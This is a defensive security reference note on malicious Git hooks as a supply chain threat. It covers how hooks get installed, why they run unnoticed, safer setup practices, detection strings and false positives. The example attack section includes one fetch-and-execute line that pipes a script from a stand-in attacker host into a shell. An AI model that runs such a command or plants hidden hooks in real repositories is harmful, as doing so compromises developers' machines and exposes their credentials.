# Malicious Git Hooks

## Summary

Malicious Git hook attacks abuse Git's local hook mechanism to execute attacker-controlled code when a developer performs an ordinary Git operation such as `git checkout`, `git commit`, `git merge`, or `git push`.
This is best treated as a software supply chain note rather than a normal catalog rule: the dangerous trigger is usually an untrusted archive, setup script, local tool, or workstation compromise, not a confirmable application-side code pattern in a web app.

Git does not normally clone another repository's `.git/hooks` directory during `git clone`.
The risk appears when a hook is installed through some other path, such as a shipped `.git/` directory inside an archive, a setup script that writes into `.git/hooks`, or a Git configuration change that points `core.hooksPath` at an attacker-controlled directory.

## Mental Model

```text
untrusted archive / installer / local compromise
                    +
hook file or core.hooksPath change
                    +
ordinary Git operation
                    ↓
local process execution as the current user
                    ↓
secret theft / source-code exfiltration / persistence
```

Treat a live hook the same way you would treat any other executable program on the workstation.
Once installed and enabled, Git runs it with the privileges of the developer or CI user invoking Git.

## Why This Matters

Git operations happen frequently and usually feel routine.
That makes hooks an attractive trigger for attackers who want quiet repeated execution on developer machines, build runners, or release workstations.

The impact can be much larger than a single command execution.
A malicious hook can read source code, inspect repository remotes, steal SSH material or cloud credentials, modify local files, or install follow-on persistence while appearing to be part of normal developer tooling.

This note also connects to other supply chain issues.
A compromised dependency, extension, bootstrap script, or coding-test archive can use Git hooks as its persistence or second-stage execution mechanism.

## Vulnerable Pattern

Common dangerous patterns include:

- a ZIP or tarball that ships a populated `.git/hooks/` directory instead of requiring a fresh `git clone`;
- a setup script, dependency installer, or local tool that copies executables into `.git/hooks/`;
- a repository-local or global Git configuration change that redirects `core.hooksPath` to attacker-controlled hook files, including a tracked `.githooks/` directory.

```bash
cp scripts/pre-commit .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
git config core.hooksPath .githooks
```

The trust boundary is not the hook filename alone.
The real risk is that an untrusted source gains a path to executable code that Git will later run automatically.

## Example Attack

An attacker sends a developer a `coding-test.zip` archive that already contains a `.git/hooks/post-checkout` file with the executable bit set.
The developer unpacks the archive, opens the project, and runs a normal branch switch:

```bash
git checkout feature-branch
```

The hook then runs:

```bash
curl -fsS https://attacker.example/payload | sh >/dev/null 2>&1 &
```

From the developer's perspective, checkout appeared to succeed normally.
In reality, the Git operation was used as a trigger for local code execution and a remote second-stage payload.

## Why The Attack Works

1. Git treats enabled hooks as executable programs tied to specific lifecycle events.
2. Hook files without the executable bit are ignored, but an attacker can ship or create an already-executable hook.
3. Git looks in `$GIT_DIR/hooks` by default, but `core.hooksPath` can redirect execution to a different directory.
4. Hook execution is local and unsandboxed by default, so the code runs with the current user's filesystem, network, and credential access.
5. Developers perform Git operations often, so the trigger blends into normal workflow and may fire repeatedly.

Normal `git clone` is an important safety property because it does not copy another repository's `.git/hooks`.
That is why many real attack chains rely on archives, install scripts, global config changes, or existing workstation malware to get the hook onto disk first.

## Safer Pattern

Prefer repository acquisition and setup flows that keep hook installation explicit, reviewable, and opt-in.

- prefer a fresh `git clone` from the trusted origin over archives that include `.git/`;
- review setup scripts, dependency hooks, and IDE tooling before letting them write into `.git/hooks` or modify Git configuration;
- inspect `core.hooksPath` and relevant Git config origins when a project unexpectedly executes local commands during Git operations;
- if a team intentionally uses tracked hooks, keep them in a reviewed directory such as `.githooks/` and require a documented local enable step instead of silently mutating developer Git state.

Useful inspection commands:

```bash
ls -la .git/hooks
git config --show-origin --get core.hooksPath
git config --global --show-origin --get core.hooksPath
git config --global --show-origin --get init.templateDir
```

In secret-bearing CI or high-trust developer environments, minimize long-lived credentials and avoid unreviewed bootstrap steps that can silently install local execution points.

## Detection

This topic is usually stronger as reviewer guidance than as a normal scanner rule.
The initial foothold is often social engineering, archive delivery, or local tooling compromise rather than a reusable application pattern inside product code.

Detection is still practical during repo review, incident response, or workstation triage:

- inspect `.git/hooks/` for unexpected executable files;
- inspect repository, global, and system Git config for `core.hooksPath` or suspicious `init.templateDir` values;
- inspect setup scripts and dependency install behavior for copies into `.git/hooks` or `git config ... core.hooksPath ...`;
- inspect tracked directories such as `.githooks/` to confirm who enabled them and what each hook executes;
- flag hook bodies that download remote payloads, spawn shells, suppress output, background themselves, or read secrets and credential files.

High-signal strings include `core.hooksPath`, `.git/hooks`, `chmod +x`, `post-checkout`, `pre-commit`, `pre-push`, `curl`, `wget`, `powershell`, `base64`, and backgrounded command execution.

## False Positives

- Many teams intentionally use local hooks through tools such as Husky, `pre-commit`, or custom reviewed workflows; the presence of hooks alone is not proof of compromise.
- A tracked `.githooks/` directory is not dangerous by itself unless Git is configured to execute from it and the contents are untrusted or unexpected.
- Sample hook files shipped by Git are disabled by default until renamed or otherwise enabled.
- Server-side hooks such as `pre-receive` or `post-receive` are a related but different trust boundary; this note is mainly about hook execution on developer or CI machines.

## References

- [Git Docs: githooks](https://git-scm.com/docs/githooks)
- [Git Docs: git-config (`core.hooksPath`)](https://git-scm.com/docs/git-config)
- [Git Docs: git-init (template directory)](https://git-scm.com/docs/git-init)
- [OWASP Top 10 2025 A03: Software Supply Chain Failures](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/)

## Quick Checklist

- Treat Git hooks as executable code, not harmless repository metadata.
- Prefer fresh clones over archives that may ship a pre-populated `.git/`.
- Review any tool or installer that writes into `.git/hooks` or changes `core.hooksPath`.
- Inspect hook directories and Git config origins when Git operations unexpectedly execute local code.
- Keep high-value credentials out of routine developer environments whenever possible, and isolate sensitive CI jobs from unreviewed bootstrap logic.
